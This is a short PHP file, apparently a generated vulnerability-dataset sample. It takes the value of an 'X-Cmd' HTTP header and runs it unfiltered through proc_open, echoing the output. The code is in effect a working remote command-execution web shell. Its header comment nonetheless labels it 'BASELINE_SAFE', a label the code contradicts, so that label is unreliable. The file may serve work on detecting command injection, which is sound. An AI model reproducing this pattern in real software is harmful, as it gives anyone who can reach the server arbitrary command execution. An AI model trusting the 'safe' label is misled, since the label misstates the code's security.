<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_FOREACH_ISTR; SKELETON=S1; KEY=cmd; SINK=B5; VAR=v0011; HDR_NAME=X-Cmd */
function SINK_B5($command){
    $process = proc_open($command, [["pipe", "r"], ["pipe", "w"]], $pipes);
            if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[0]);
            proc_close($process);
            echo $output;
}
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = "";
foreach($h as $k=>$v){ if(strcasecmp((string)$k, "X-Cmd")===0){ $inp = (string)$v; break; } }
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B5($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
